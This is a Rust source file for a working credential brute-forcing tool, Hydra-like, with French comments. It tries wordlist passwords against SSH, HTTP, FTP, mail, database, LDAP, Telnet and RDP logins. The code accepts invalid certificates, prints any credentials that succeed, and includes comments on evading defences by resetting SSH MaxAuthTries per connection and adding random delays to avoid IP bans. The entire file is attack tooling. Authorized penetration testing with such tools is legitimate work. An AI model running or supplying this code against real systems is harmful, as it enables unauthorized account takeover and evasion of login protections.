mod args;
mod header;

use args::SupArgs;
use clap::Parser;
use std::sync::Arc;
use tokio::sync::Semaphore;
use tokio::fs::File;
use tokio::io::{AsyncBufReadExt, AsyncWriteExt, AsyncReadExt, BufReader};
use colored::*;
use ssh2::Session;
use reqwest::Client;
use suppaftp::AsyncFtpStream;
use base64::{engine::general_purpose, Engine as _};
use native_tls::TlsConnector;
use tokio::process::Command;
use mongodb::{options::ClientOptions, Client as MongoClient};
use tokio::task::JoinSet;
use tokio::time::{timeout, Duration};

// --- UTILITAIRES RÉSEAU ---

async fn connect_tls(host: &str, port: u16) -> Option<tokio_native_tls::TlsStream<tokio::net::TcpStream>> {
    let addr = format!("{}:{}", host, port);
    let connector = TlsConnector::builder().danger_accept_invalid_certs(true).build().ok()?;
    let tokio_connector = tokio_native_tls::TlsConnector::from(connector);
    let stream = timeout(Duration::from_secs(3), tokio::net::TcpStream::connect(&addr)).await.ok()?.ok()?;
    tokio_connector.connect(host, stream).await.ok()
}

// --- MODULES DE CONNEXION ---

async fn attempt_ssh(host: &str, port: u16, user: &str, pass: &str) -> bool {
    let addr = format!("{}:{}", host, port);
    let u = user.to_string();
    let p = pass.to_string();

    tokio::task::spawn_blocking(move || {
        // Nouvelle connexion TCP pour chaque essai = Reset du compteur MaxAuthTries
        let stream = std::net::TcpStream::connect_timeout(
            &addr.parse().ok()?, 
            std::time::Duration::from_secs(5)
        ).ok()?;

        let mut sess = Session::new().ok()?;
        sess.set_tcp_stream(stream);
        sess.set_timeout(5000);

        if sess.handshake().is_err() { return None; }

        sess.set_blocking(true);
        let success = if sess.userauth_password(&u, &p).is_ok() {
            sess.authenticated()
        } else {
            false
        };

        // Fermeture propre pour libérer le slot sur le serveur
        let _ = sess.disconnect(None, "Logout", None);
        
        if success { Some(true) } else { None }
    }).await.unwrap_or(None).unwrap_or(false)
}

async fn attempt_http(client: &Client, target: &str, port: u16, user: &str, pass: &str, error_msg: &Option<String>) -> bool {
    let url = if target.starts_with("http") { target.to_string() } else {
        let proto = if port == 443 { "https" } else { "http" };
        format!("{}://{}:{}", proto, target, port)
    };
    
    let res = match error_msg {
        Some(msg) => {
            let params = [("user", user), ("pass", pass)];
            client.post(&url).form(&params).timeout(Duration::from_secs(3)).send().await
        }
        None => client.get(&url).basic_auth(user, Some(pass)).timeout(Duration::from_secs(3)).send().await
    };
    
    if let Ok(r) = res {
        if let Some(msg) = error_msg {
            if let Ok(text) = r.text().await { return !text.contains(msg); }
        } else { return r.status().is_success() || r.status().is_redirection(); }
    }
    false
}

async fn attempt_smtp(host: &str, port: u16, user: &str, pass: &str) -> bool {
    if let Some(mut s) = connect_tls(host, port).await {
        let mut buf = [0; 1024];
        let _ = s.read(&mut buf).await;
        let _ = s.write_all(b"EHLO localhost\r\n").await;
        let _ = s.read(&mut buf).await;
        let _ = s.write_all(b"AUTH LOGIN\r\n").await;
        let _ = s.read(&mut buf).await;
        let _ = s.write_all(format!("{}\r\n", general_purpose::STANDARD.encode(user)).as_bytes()).await;
        let _ = s.read(&mut buf).await;
        let _ = s.write_all(format!("{}\r\n", general_purpose::STANDARD.encode(pass)).as_bytes()).await;
        let n = timeout(Duration::from_secs(2), s.read(&mut buf)).await.unwrap_or(Ok(0)).unwrap_or(0);
        return String::from_utf8_lossy(&buf[..n]).contains("235");
    }
    false
}

async fn attempt_pop3(host: &str, port: u16, user: &str, pass: &str) -> bool {
    if let Some(mut s) = connect_tls(host, port).await {
        let mut buf = [0; 1024];
        let _ = s.read(&mut buf).await;
        let _ = s.write_all(format!("USER {}\r\n", user).as_bytes()).await;
        let _ = s.read(&mut buf).await;
        let _ = s.write_all(format!("PASS {}\r\n", pass).as_bytes()).await;
        let n = timeout(Duration::from_secs(2), s.read(&mut buf)).await.unwrap_or(Ok(0)).unwrap_or(0);
        return String::from_utf8_lossy(&buf[..n]).contains("+OK");
    }
    false
}

async fn attempt_imap(host: &str, port: u16, user: &str, pass: &str) -> bool {
    if let Some(mut s) = connect_tls(host, port).await {
        let mut buf = [0; 1024];
        let _ = s.read(&mut buf).await;
        let _ = s.write_all(format!("A1 LOGIN {} {}\r\n", user, pass).as_bytes()).await;
        let n = timeout(Duration::from_secs(2), s.read(&mut buf)).await.unwrap_or(Ok(0)).unwrap_or(0);
        return String::from_utf8_lossy(&buf[..n]).contains("A1 OK");
    }
    false
}

async fn attempt_mysql(host: &str, port: u16, user: &str, pass: &str) -> bool {
    let url = format!("mysql://{}:{}@{}:{}", user, pass, host, port);
    timeout(Duration::from_secs(3), sqlx::MySqlPool::connect(&url)).await.is_ok()
}

async fn attempt_postgres(host: &str, port: u16, user: &str, pass: &str) -> bool {
    let url = format!("postgres://{}:{}@{}:{}/postgres", user, pass, host, port);
    timeout(Duration::from_secs(3), sqlx::PgPool::connect(&url)).await.is_ok()
}

async fn attempt_mongodb(host: &str, port: u16, user: &str, pass: &str) -> bool {
    let uri = format!("mongodb://{}:{}@{}:{}/", user, pass, host, port);
    if let Ok(opt) = ClientOptions::parse(uri).await {
        if let Ok(c) = MongoClient::with_options(opt) { 
            return timeout(Duration::from_secs(3), c.list_database_names(None, None)).await.is_ok(); 
        }
    }
    false
}

async fn attempt_ldap(host: &str, port: u16, user: &str, pass: &str) -> bool {
    let addr = format!("ldap://{}:{}", host, port);
    let u = user.to_string();
    let p = pass.to_string();
    tokio::task::spawn_blocking(move || {
        use ldap3::LdapConn;
        if let Ok(mut ldap) = LdapConn::new(&addr) {
            return ldap.simple_bind(&u, &p).is_ok();
        }
        false
    }).await.unwrap_or(false)
}

async fn attempt_telnet(host: &str, port: u16, user: &str, pass: &str) -> bool {
    if let Ok(Ok(mut s)) = timeout(Duration::from_secs(3), tokio::net::TcpStream::connect(format!("{}:{}", host, port))).await {
        let mut b = [0; 1024];
        let _ = s.read(&mut b).await;
        let _ = s.write_all(format!("{}\n", user).as_bytes()).await;
        tokio::time::sleep(Duration::from_millis(300)).await;
        let _ = s.write_all(format!("{}\n", pass).as_bytes()).await;
        let n = timeout(Duration::from_secs(2), s.read(&mut b)).await.unwrap_or(Ok(0)).unwrap_or(0);
        let res = String::from_utf8_lossy(&b[..n]).to_lowercase();
        return !res.contains("incorrect") && !res.contains("failed");
    }
    false
}

async fn attempt_rdp(host: &str, port: u16, user: &str, pass: &str) -> bool {
    let out = Command::new("xfreerdp")
    .args(["/v:", &format!("{}:{}", host, port), "/u:", user, "/p:", pass, "+auth-only", "/cert-ignore"])
    .output().await;
    out.map(|o| o.status.success()).unwrap_or(false)
}

// --- MOTEUR PRINCIPAL ---

#[tokio::main]
async fn main() -> anyhow::Result<()> {
    header::show("Cheikh ELghadi", "https://github.com/23092-ctrl");
    let args = SupArgs::parse();
    
    let mut users: Vec<String> = Vec::new();
    if let Some(u) = args.user {
        users.push(u.trim().to_string());
    } else if let Some(path) = args.userlist {
        let f = File::open(path).await?;
        let mut lines = BufReader::new(f).lines();
        while let Some(line) = lines.next_line().await? {
            let u = line.trim().to_string();
            if !u.is_empty() { users.push(u); }
        }
    } else {
        anyhow::bail!("Veuillez spécifier --user ou --userlist");
    }
    
    let mut passwords: Vec<String> = Vec::new();
    let f_pass = File::open(&args.wordlist).await?;
    let mut p_lines = BufReader::new(f_pass).lines();
    while let Some(line) = p_lines.next_line().await? {
        let p = line.trim_matches(|c: char| c == '\r' || c == '\n' || c.is_whitespace()).to_string();
        if !p.is_empty() { passwords.push(p); }
    }
    
    let semaphore = Arc::new(Semaphore::new(args.threads));
    let client = Arc::new(Client::builder().danger_accept_invalid_certs(true).build()?);
    let mut set = JoinSet::new();
    
    println!("{} Target: {} | Service: {}", "[*]".blue(), args.target.bold(), args.service.cyan());
    
    for user_name in &users {
        for password in &passwords {
            let permit = Arc::clone(&semaphore).acquire_owned().await?;
            
            let t = args.target.clone();
            let u = user_name.clone();
            let p_str = password.clone();
            let s = args.service.to_lowercase();
            let e = args.error.clone();
            let h_client = Arc::clone(&client);
            
            let port = args.port.unwrap_or(match s.as_str() {
               "ssh" => 22, "ftp" => 21, "telnet" => 23, "smtp" => 465, 
                "pop3" => 995, "imap" => 993, "mysql" => 3306, 
                "postgres" => 5432, "mongodb" => 27017,
                "ldap" => 389, "rdp" => 3389, "http" => 80, "https" => 443, 
                _ => 22,
            });
            
            set.spawn(async move {
                let _permit = permit;
                
                // Délai aléatoire pour SSH pour éviter le bannissement IP instantané
                if s == "ssh" {
                    let delay = (rand::random::<u64>() % 150) + 150; 
                    tokio::time::sleep(Duration::from_millis(delay)).await;
                }

                let ok = match s.as_str() {
                    "ssh" => attempt_ssh(&t, port, &u, &p_str).await,
                    "http" | "https" => attempt_http(&h_client, &t, port, &u, &p_str, &e).await,
                    "ftp" => {
                        let addr = format!("{}:{}", t, port);
                        if let Ok(Ok(mut ftp)) = timeout(Duration::from_secs(5), AsyncFtpStream::connect(addr)).await {
                            let res = ftp.login(&u, &p_str).await.is_ok();
                            let _ = ftp.quit().await;
                            res
                        } else { false }
                    },
                    "smtp"     => attempt_smtp(&t, port, &u, &p_str).await,
                    "pop3"     => attempt_pop3(&t, port, &u, &p_str).await,
                    "imap"     => attempt_imap(&t, port, &u, &p_str).await,
                    "mysql"    => attempt_mysql(&t, port, &u, &p_str).await,
                    "postgres" => attempt_postgres(&t, port, &u, &p_str).await,
                    "mongodb"  => attempt_mongodb(&t, port, &u, &p_str).await,
                    "ldap"     => attempt_ldap(&t, port, &u, &p_str).await,
                    "telnet"   => attempt_telnet(&t, port, &u, &p_str).await,
                    "rdp"      => attempt_rdp(&t, port, &u, &p_str).await,
                    _ => false,
                };
                
                if ok {
                    println!("\n{}", "====================================================".green());
                    println!("{} SUCCÈS TROUVÉ !", "[+]".green().bold());
                    println!("{} Utilisateur : {}", " > ".green(), u.bold());
                    println!("{} Mot de passe : {}", " > ".green(), p_str.yellow().bold());
                    println!("{}\n", "====================================================".green());
                    std::process::exit(0); 
                }
            });
        }
    }
    
    while let Some(_) = set.join_next().await {}
    println!("{} Fin du scan. Aucun mot de passe trouvé.", "[!]".yellow());
    Ok(())
}
